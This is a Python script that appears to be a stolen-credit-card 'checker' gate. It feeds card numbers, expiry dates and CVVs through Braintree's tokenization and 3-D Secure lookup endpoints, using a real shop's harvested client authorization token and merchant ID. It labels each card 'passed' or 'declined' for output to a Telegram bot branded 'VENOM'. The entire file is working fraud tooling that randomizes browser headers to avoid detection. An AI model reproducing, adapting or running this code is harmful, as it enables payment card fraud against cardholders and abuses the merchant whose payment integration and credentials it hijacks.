import requests, time
from fake_useragent import UserAgent

def process_card_p(card_data):
    start_time = time.time()
    ua = UserAgent()
    rua = ua.random

    try:
        cc_num, mes, ano, cvv = card_data.split('|')
        if "20" in ano:
            ano = ano.split("20")[1]
        mes = mes.zfill(2)
    except Exception:
        return card_data, "Bad Format ❌", False, 4, None # Return code 4 for decline

    card = f"{cc_num}|{mes}|{ano}|{cvv}"

    #------------------------------------#
    # Tokenize
    headers_tokenize = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTY0ODM5NDYsImp0aSI6ImU0NjY3ODI3LTI0ZTItNGMyYy04OWQ2LTQyOGRiMmI1MGU4ZiIsInN1YiI6ImNnZnM2OGJ2c3g1bjI4OGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNnZnM2OGJ2c3g1bjI4OGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.AEoKKywTLX57pPzS56aFCFELjUVprNzRr1G7eqwTaNxSofZK7llA_Gis560jXtoN4Lq9KozfD4U3k3GzpaqrDQ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': rua,
}

    json_data_tokenize = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '93840d7c-ec6f-4169-a2d5-3c797a2cb70d',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc_num.strip(),
                'expirationMonth': mes.strip(),
                'expirationYear': ano.strip(),
                'cvv': cvv.strip(),
                'cardholderName': 'venom',
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    try:
        r1 = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_tokenize, json=json_data_tokenize, timeout=10
        )
        data1 = r1.json()
        token = data1['data']['tokenizeCreditCard']['token']
    except Exception:
        msg_text = f"Tokenize Error"
        return card, msg_text, False, 4, None # Return code 4 for decline

    #------------------------------------#
    # Lookup
    headers_lookup = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://shop.getprotection.com.my',
    'priority': 'u=1, i',
    'referer': 'https://shop.getprotection.com.my/checkout',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': rua,
}

    json_data_lookup = {
    'amount': '97.10',
    'additionalInfo': {
        'acsWindowSize': '03',
        'billingPhoneNumber': '3342379842',
        'billingGivenName': '\u202aMohammed',
        'billingSurname': 'Saeed\u202c\u200f',
        'email': 'testbin180copra@gmail.com',
    },
    'bin': cc_num[:6],
    'dfReferenceId': '0_2d1ccf6f-78e0-4e50-8075-cee0e90f97c7',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.92.0',
        'cardinalDeviceDataCollectionTimeElapsed': 465,
        'issuerDeviceDataCollectionTimeElapsed': 6797,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTY0ODM5NDYsImp0aSI6ImU0NjY3ODI3LTI0ZTItNGMyYy04OWQ2LTQyOGRiMmI1MGU4ZiIsInN1YiI6ImNnZnM2OGJ2c3g1bjI4OGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNnZnM2OGJ2c3g1bjI4OGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.AEoKKywTLX57pPzS56aFCFELjUVprNzRr1G7eqwTaNxSofZK7llA_Gis560jXtoN4Lq9KozfD4U3k3GzpaqrDQ',
    'braintreeLibraryVersion': 'braintree/web/3.92.0',
    '_meta': {
        'merchantAppId': 'shop.getprotection.com.my',
        'platform': 'web',
        'sdkVersion': '3.92.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '93840d7c-ec6f-4169-a2d5-3c797a2cb70d',
    },
}

    try:
        r2 = requests.post(
            f'https://api.braintreegateway.com/merchants/cgfs68bvsx5n288f/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
            headers=headers_lookup, json=json_data_lookup, timeout=10
        )
        data2 = r2.json()
        vbv_status = data2['paymentMethod']['threeDSecureInfo']['status']
    except Exception:
        msg_text = f"Lookup Error"
        return card, msg_text, False, 4, None # Return code 4 for decline
    time.sleep(20)
    #------------------------------------#
    # تحديد الرد والرمز الصحيح لكل حالة
    result_code = 4 # Default to declined

    if "authenticate_attempt_successful" in vbv_status:
        msg_text, status = "passed authenticate_attempt_successful", "passed ✅"
        result_code = 1 # Code for Passed/Working
    elif "authenticate_successful" in vbv_status:
        msg_text, status = "3DS Authenticate Successful ✅", "passed ✅"
        result_code = 1 # Code for Passed/Working
    elif "challenge_required" in vbv_status:
        msg_text, status = "3DS Challenge Required ❌", "Declined ❌"
        result_code = 5 # Code for Risk/OTP
    elif "frictionless_failed" in vbv_status:
        msg_text, status = "3DS Authenticate Frictionless Failed ❌", "Declined ❌"
        result_code = 4 # Code for general Decline
    else:
        msg_text, status = f"3DS Unknown ❓ ({vbv_status})", "Declined ❌"
        result_code = 4 # Code for general Decline

    execution_time = time.time() - start_time
    
    bot_msg = None
    if "passed ✅" in status:
        bot_msg = f"""
═════[  <a href='tg://user?id=1861702459'> VENOM </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs : {status}
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Omega V2
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=1861702459'>VENOM</a> 』══"""

    # إرجاع الرمز الصحيح مع بقية البيانات
    return card, msg_text, True, result_code, bot_msg